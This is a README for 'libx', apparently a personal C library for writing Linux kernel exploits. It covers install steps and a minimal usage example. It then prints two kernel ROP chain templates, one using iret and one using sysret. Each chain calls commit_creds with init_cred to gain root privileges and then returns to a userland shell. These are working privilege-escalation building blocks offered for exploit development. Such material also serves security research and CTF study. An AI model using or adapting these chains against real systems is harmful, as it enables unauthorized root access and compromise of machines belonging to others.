# libx

It's a personal c language library for kernel exploits. 

# Dependencies

```sh
# If you use fuse
sudo apt install fuse libfuse-dev libkeyutils-dev
```

# Usage

Install `libx`
```bash
git clone git@github.com:n132/libx.git
cd libx
make
make install # you may need sudo
```


uninstall `libx`

```bash
make clean
make uninstall
```

# Example

```c
//gcc main.c -o ./main -lx -w
#include <libx.h>
int main(){
    libxInit();
}
```

# KROP

In kernel ROP, we usually return to user land by `iret` or `sysret`.

## iret
```c
    p[idx++]  = rdi;
    p[idx++]  = init_cred                   - NO_ASLR_BASE + base;
    p[idx++]  = commit_creds                - NO_ASLR_BASE + base;
    p[idx++]  = swapgs_restore_regs_and_return_to_usermode + 103 - NO_ASLR_BASE + base;
    p[idx++]  = *(size_t*) "RDI";
    p[idx++]  = *(size_t*) "RAX";
    p[idx++]  = shell;
    p[idx++]  = user_cs;
    p[idx++]  = user_rflags;
    p[idx++]  = user_sp|8;
    p[idx++]  = user_ss;
```
## sysret
```c
    p[idx++]  = rdi;
    p[idx++]  = init_cred                   - NO_ASLR_BASE + base;
    p[idx++]  = commit_creds                - NO_ASLR_BASE + base;
    p[idx++]  = r11;
    p[idx++]  = user_rflags;
    p[idx++]  = rcx;
    p[idx++]  = shell;
    p[idx++]  = sysret; // pop rsp; swapgs; sysret
    p[idx++]  = user_sp|8;
```



